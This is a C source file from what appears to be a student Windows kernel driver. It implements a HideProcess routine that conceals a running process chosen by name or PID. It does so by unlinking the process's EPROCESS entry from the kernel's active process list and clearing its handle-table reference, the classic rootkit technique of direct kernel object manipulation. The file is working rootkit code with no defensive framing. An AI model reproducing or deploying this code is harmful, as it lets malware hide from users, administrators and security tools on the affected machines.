/*
** File		hide_process.c
** Author	lucaze_b <alexis1.lucazeau@epitech.eu>
** Desc		HideProcess function find 
** 			and hide the process corresponding 
**			to the PID or Name received as parameter.
*/

#include <ntifs.h>
#include <stdlib.h>
#include "driver.h"

NTSTATUS			RemoveFromActiveProcessList(IN PEPROCESS eproc)
{
	PLIST_ENTRY		plActivProcs;

	DbgPrintEx(DFLAGS, "Removing process from ActiveProcessLinks list\n");
	plActivProcs = (LIST_ENTRY *)((ULONG) eproc + EPROCESS_FLINK_OFFSET);
	
	*((ULONG *) plActivProcs->Blink) = (ULONG) plActivProcs->Flink;
	*((ULONG *) plActivProcs->Flink + 1) = (ULONG) plActivProcs->Blink;

	plActivProcs->Flink = (LIST_ENTRY *) &(plActivProcs->Flink);
	plActivProcs->Blink = (LIST_ENTRY *) &(plActivProcs->Flink);

	return (STATUS_SUCCESS);
}

NTSTATUS			RemoveFromObjectTable(IN PEPROCESS eproc)
{	
	ULONG			oTable;

	oTable = *((ULONG *) ((ULONG) eproc + EPROCESS_OTABLE_OFFSET));
	DbgPrintEx(DFLAGS, "ObjectTable address: %x\n", oTable);
	if (oTable != (ULONG) NULL)
	{
		DbgPrintEx(DFLAGS, "Removing EPROCESS pointer from ObjectTable\n");
		*((ULONG *)(oTable + HANDLETABLE_QUOTAPROCESS_OFFSET)) = (ULONG) 0;
		return (STATUS_SUCCESS);
	}
	DbgPrintEx(DFLAGS, "Error: No ObjectTable !\n");
	return (STATUS_UNSUCCESSFUL);
}

NTSTATUS			HideProcess(IN PCHAR params)
{
	NTSTATUS		ret;
	PEPROCESS		eproc;
	ULONG			err;

	err = 0;
	DbgPrintEx(DFLAGS, "Process to hide: %s\n", params);
	if (atoi(params) == 0)
		eproc = FindEPROCESSByName(params);
	else
		eproc = FindEPROCESSByPID(atoi(params));
	if (eproc == NULL)
		return (STATUS_INVALID_PARAMETER);
	DbgPrintEx(DFLAGS, "EPROCCESS address found: %x\n", eproc);
	
	ret = RemoveFromObjectTable(eproc);
	if (ret != STATUS_SUCCESS)
		err = 1;
		
	ret = RemoveFromActiveProcessList(eproc);
	if (ret != STATUS_SUCCESS)
		err = 1;

	if (err)
		return (STATUS_UNSUCCESSFUL);

	return (STATUS_SUCCESS);
}
